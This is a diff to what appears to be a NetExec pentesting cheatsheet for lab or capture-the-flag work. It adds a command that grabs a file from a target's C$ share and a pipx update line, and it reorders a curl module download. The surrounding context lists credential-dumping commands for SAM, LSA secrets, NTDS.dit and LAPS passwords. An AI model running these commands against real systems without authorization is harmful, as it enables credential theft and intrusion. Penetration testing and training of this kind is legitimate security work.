@@ -4,6 +4,9 @@ NOTE: Pwn3d! means code exec and RDP possible.
 ## General Usage
 
 ```bash
+# Update
+pipx upgrade netexec
+
 # NETEXEC CHEATSHEET | <T>=Target <D>=Domain <U>=User <P>=Pass <H>=Hash <S>=SID
 # === AUTH & SPRAY ================================================================
 nxc smb <T> -u <U> -p <P> --pass-pol                   # Check pass policy first
@@ -43,6 +46,7 @@ nxc ldap <T> -u <U> -p <P> -M bloodhound -o COLLECTION_METHOD=All # BloodHound
 nxc smb <T> -u <U> -p <P> --sam                        # Dump SAM hashes
 nxc smb <T> -u <U> -p <P> --lsa                        # Dump LSA secrets
 nxc smb <T> -u <U> -p <P> --ntds                       # Dump NTDS.dit (DC)
+nxc smb <T> -u <U> -p <p> --get-file 'TARGET FILE PATH' /output/path/flag.txt --share C$                                               # Grab a file
 nxc ldap <T> -u <U> -p <P> -M laps                     # Read LAPS passwords
 nxc ldap <T> -u <U> -p <P> -M tombstone -o ACTION=query# Query for deleted objects 
 	-M tombstone -o ACTION=restore ID=<ID> SCHEME=ldap # Restore deleted User
@@ -93,7 +97,7 @@ proxychains -q nxc ldap DC1.ad.lab -d 'ad.lab' -u 'john.doe' -p 'P@$$word123!' -
 find / -path "*/nxc/modules" -type d 2>/dev/null
 
 # Download module file
-curl -o <file.py> <URL>
+curl <URL> -o <file.py>
 
 # Verify it loads
 nxc <protocol> --list-modules | grep '<module>'
